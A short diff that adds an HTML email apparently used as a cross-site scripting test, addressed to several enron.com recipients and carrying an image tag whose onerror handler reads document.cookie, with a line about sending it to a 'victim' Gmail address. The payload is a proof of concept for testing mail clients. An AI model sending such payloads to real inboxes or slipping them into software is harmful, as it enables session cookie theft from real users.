@@ -1,0 +1,7 @@
+From: lwolf@greenwichtech.com
+To: chris.bailey@enron.com, danny.hostetler@enron.com, dale.korver@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
